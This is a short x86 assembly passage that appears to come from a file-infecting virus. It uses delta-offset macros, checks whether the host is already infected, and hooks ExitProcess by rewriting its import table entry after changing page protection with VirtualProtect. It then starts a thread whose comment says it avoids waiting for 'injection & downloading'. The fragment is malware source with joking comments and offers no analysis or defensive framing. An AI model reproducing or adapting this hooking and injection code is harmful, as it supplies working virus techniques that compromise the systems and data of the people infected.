; Hook ExitProcess
hookExitProcess:
; mov eax, KernelIAT RVA Addr
; mov ecx, BaseAddress + Offset ExitProcess
; mov eax, [eax] ; Kernel IAT VA
; add ecx, eax ; Kernel IAT ExitProcess
; mov eax, [ecx] ; Addr ExitProcess
jmp	notInfected ; When not infected yet
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

; WE SHALL PASS!
pusha
PDELTA	OldProtect
push	PAGE_READWRITE
push	4
push	ecx
call	[DELTA pVirtualProtect]
popa
mov	eax, hook_exitprocess
add	eax, ebp
; Hook ExitProcess
mov	dword ptr [ecx], eax
; Restore Gandalf
pusha
PDELTA	OldProtect
PVDELTA	OldProtect
push	4
push	ecx
call	[DELTA pVirtualProtect]
popa


notInfected:

; Create Thread to avoid waiting injection & downloading
PDELTA	ThreadId
push	0
push	ebp
PDELTA	threadProgram
push	0
push	0
call	[DELTA pCreateThread]

nop
nop
nop
